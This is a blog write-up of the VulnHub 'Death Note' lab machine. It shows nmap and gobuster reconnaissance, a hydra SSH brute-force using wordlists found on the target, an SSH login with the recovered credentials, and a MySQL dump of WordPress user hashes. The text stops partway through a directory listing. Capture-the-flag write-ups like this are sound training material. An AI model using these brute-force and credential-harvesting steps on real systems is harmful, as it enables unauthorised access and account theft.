@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>VulnHub Writeup - Death Note (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Death Note from VulnHub." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/death_note/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="VulnHub Writeup - Death Note (Easy)">
+<meta property="og:description" content="Writeup of Death Note from VulnHub." />
+<meta property="og:url" content="/posts/death_note/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/death_note/">VulnHub Writeup - Death Note (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-05</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/vulnhub/">VulnHub</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Death Note</code> machine is an easy linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sV -sC 10.0.0.2
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-12 11:39 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> deathnote.vuln <span style="color:#f92672">(</span>10.0.0.2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00082s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 5eb8ff2dacc7e93c992f3bfcda5ca353 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a8f3819d0adc169a49eebc24e4655ca6 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4f20c32d19755be81f320175c2709a7e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.85 seconds
+</span></span></code></pre></div><h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a directory enumeration with <code>gobuster</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://deathnote.vuln/wordpress/   -w  /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.4
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://deathnote.vuln/wordpress/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/02/12 11:45:59 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 279<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 331<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://deathnote.vuln/wordpress/wp-content/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 329<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://deathnote.vuln/wordpress/wp-admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 332<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://deathnote.vuln/wordpress/wp-includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/02/12 11:46:03 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>I go in this directory <code>http://deathnote.vuln/wordpress/wp-content/uploads</code>, I click <code>2021/</code>, after I click <code>07/</code> and I find <code>two wordlists</code>:</p>
+<p>&ndash;&gt; notes.txt(password&rsquo;s wordlist):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>death4
+</span></span><span style="display:flex;"><span>death4life
+</span></span><span style="display:flex;"><span>death4u
+</span></span><span style="display:flex;"><span>death4ever
+</span></span><span style="display:flex;"><span>death4all
+</span></span><span style="display:flex;"><span>death420
+</span></span><span style="display:flex;"><span>death45
+</span></span><span style="display:flex;"><span>death4love
+</span></span><span style="display:flex;"><span>death49
+</span></span><span style="display:flex;"><span>death48
+</span></span><span style="display:flex;"><span>death456
+</span></span><span style="display:flex;"><span>death4014
+</span></span><span style="display:flex;"><span>1death4u
+</span></span><span style="display:flex;"><span>yaydeath44
+</span></span><span style="display:flex;"><span>thedeath4u2
+</span></span><span style="display:flex;"><span>thedeath4u
+</span></span><span style="display:flex;"><span>stickdeath420
+</span></span><span style="display:flex;"><span>reddeath44
+</span></span><span style="display:flex;"><span>megadeath44
+</span></span><span style="display:flex;"><span>megadeath4
+</span></span><span style="display:flex;"><span>killdeath405
+</span></span><span style="display:flex;"><span>hot2death4sho
+</span></span><span style="display:flex;"><span>death4south
+</span></span><span style="display:flex;"><span>death4now
+</span></span><span style="display:flex;"><span>death4l0ve
+</span></span><span style="display:flex;"><span>death4free
+</span></span><span style="display:flex;"><span>death4elmo
+</span></span><span style="display:flex;"><span>death4blood
+</span></span><span style="display:flex;"><span>death499Eyes301
+</span></span><span style="display:flex;"><span>death498
+</span></span><span style="display:flex;"><span>death4859
+</span></span><span style="display:flex;"><span>death47
+</span></span><span style="display:flex;"><span>death4545
+</span></span><span style="display:flex;"><span>death445
+</span></span><span style="display:flex;"><span>death444
+</span></span><span style="display:flex;"><span>death4387n
+</span></span><span style="display:flex;"><span>death4332387
+</span></span><span style="display:flex;"><span>death42521439
+</span></span><span style="display:flex;"><span>death42
+</span></span><span style="display:flex;"><span>death4138
+</span></span><span style="display:flex;"><span>death411
+</span></span><span style="display:flex;"><span>death405
+</span></span><span style="display:flex;"><span>death4me
+</span></span></code></pre></div><p>&ndash;&gt; user.txt(user&rsquo;s wordlist):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>KIRA
+</span></span><span style="display:flex;"><span>L
+</span></span><span style="display:flex;"><span>ryuk
+</span></span><span style="display:flex;"><span>rem
+</span></span><span style="display:flex;"><span>misa
+</span></span><span style="display:flex;"><span>siochira 
+</span></span><span style="display:flex;"><span>light
+</span></span><span style="display:flex;"><span>takada
+</span></span><span style="display:flex;"><span>near
+</span></span><span style="display:flex;"><span>mello
+</span></span><span style="display:flex;"><span>l
+</span></span><span style="display:flex;"><span>kira
+</span></span><span style="display:flex;"><span>RYUK
+</span></span><span style="display:flex;"><span>REM
+</span></span><span style="display:flex;"><span>SIOCHIRA
+</span></span><span style="display:flex;"><span>LIGHT
+</span></span><span style="display:flex;"><span>NEAR
+</span></span></code></pre></div><p>I save both file in my Local Machine and I use the <code>hydra</code> to find the credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano notes.txt 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano user.txt  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hydra -L /home/kali/user.txt  -P /home/kali/notes.txt  ssh://10.0.0.2 
+</span></span><span style="display:flex;"><span>Hydra v9.4 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2023-02-12 12:34:58
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">731</span> login tries <span style="color:#f92672">(</span>l:17/p:43<span style="color:#f92672">)</span>, ~46 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.0.0.2:22/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 304.00 tries/min, <span style="color:#ae81ff">304</span> tries in 00:01h, <span style="color:#ae81ff">429</span> to <span style="color:#66d9ef">do</span> in 00:02h, <span style="color:#ae81ff">14</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.0.0.2   login: l   password: death4me
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 288.50 tries/min, <span style="color:#ae81ff">577</span> tries in 00:02h, <span style="color:#ae81ff">156</span> to <span style="color:#66d9ef">do</span> in 00:01h, <span style="color:#ae81ff">14</span> active
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">5</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">5</span> targets did not resolve or could not be connected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2023-02-12 12:37:33
+</span></span></code></pre></div><pre tabindex="0"><code>- Username: l
+- Password: death4me
+</code></pre><p>I get the <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh l@10.0.0.2      
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.0.0.2 (10.0.0.2)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:Pj7G++7sat/zpoeFTsy5FUba1luVvaIo7NG0PdXzxY8.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.0.0.2<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">l@10.0.0.2&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux deathnote 4.19.0-17-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Sat Sep  <span style="color:#ae81ff">4</span> 06:12:29 <span style="color:#ae81ff">2021</span> from 192.168.1.6
+</span></span><span style="display:flex;"><span>l@deathnote:~$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> l    l    <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> l    l       <span style="color:#ae81ff">3</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l     <span style="color:#ae81ff">220</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l    <span style="color:#ae81ff">3526</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> l    l    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l     <span style="color:#ae81ff">807</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .profile
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> l    l    <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">512</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> user.txt
+</span></span><span style="display:flex;"><span>l@deathnote:~$ cat user.txt
+</span></span><span style="display:flex;"><span>++++++++++<span style="color:#f92672">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span style="color:#f92672">&lt;&lt;&lt;</span>&lt;-<span style="color:#f92672">]</span>&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------.
+</span></span><span style="display:flex;"><span>l@deathnote:~$ 
+</span></span></code></pre></div><p>I use this site <code>https://www.splitbrain.org/_static/ook/</code> to <code>decrypt</code> the `user.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>i think u got the shell , but you wont be able to kill me 
+</span></span><span style="display:flex;"><span>-kira
+</span></span></code></pre></div><h1 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="mysql">MySql<a href="#mysql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do access to <code>mysql</code> and I  find the kira&rsquo;s credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>l@deathnote:~$ mysql -u l --password<span style="color:#f92672">=</span>death4me --host<span style="color:#f92672">=</span>127.0.0.1
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+</span></span><span style="display:flex;"><span>Your MariaDB connection id is <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>Server version: 10.3.29-MariaDB-0+deb10u1 Debian <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| wordpress          |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.000 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use wordpress;
+</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
+</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database changed
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; show tables;
+</span></span><span style="display:flex;"><span>+-----------------------+
+</span></span><span style="display:flex;"><span>| Tables_in_wordpress   |
+</span></span><span style="display:flex;"><span>+-----------------------+
+</span></span><span style="display:flex;"><span>| wp_commentmeta        |
+</span></span><span style="display:flex;"><span>| wp_comments           |
+</span></span><span style="display:flex;"><span>| wp_links              |
+</span></span><span style="display:flex;"><span>| wp_options            |
+</span></span><span style="display:flex;"><span>| wp_postmeta           |
+</span></span><span style="display:flex;"><span>| wp_posts              |
+</span></span><span style="display:flex;"><span>| wp_term_relationships |
+</span></span><span style="display:flex;"><span>| wp_term_taxonomy      |
+</span></span><span style="display:flex;"><span>| wp_termmeta           |
+</span></span><span style="display:flex;"><span>| wp_terms              |
+</span></span><span style="display:flex;"><span>| wp_usermeta           |
+</span></span><span style="display:flex;"><span>| wp_users              |
+</span></span><span style="display:flex;"><span>+-----------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span> rows in set <span style="color:#f92672">(</span>0.000 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from wp_users;
+</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+-------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
+</span></span><span style="display:flex;"><span>| ID | user_login | user_pass                          | user_nicename | user_email        | user_url                        | user_registered     | user_activation_key | user_status | display_name |
+</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+-------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
+</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | kira       | $P$BLAm2r4YofLSOywvLguipu8Av1Tuwq. | kira          | kira123@gmail.com | http://deathnote.vuln/wordpress | 2021-07-19 13:36:00 |                     |           <span style="color:#ae81ff">0</span> | kira         |
+</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+-------------------+---------------------------------+---------------------+---------------------+-------------+--------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.000 sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; 
+</span></span></code></pre></div><p>I can&rsquo;t crack kira&rsquo;s hash</p>
+<p>After many enumeration I find this directory and many file :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>l@deathnote:/$ cd opt
+</span></span><span style="display:flex;"><span>l@deathnote:/opt$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> L
+</span></span><span style="display:flex;"><span>l@deathnote:/opt$ cd L
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> .
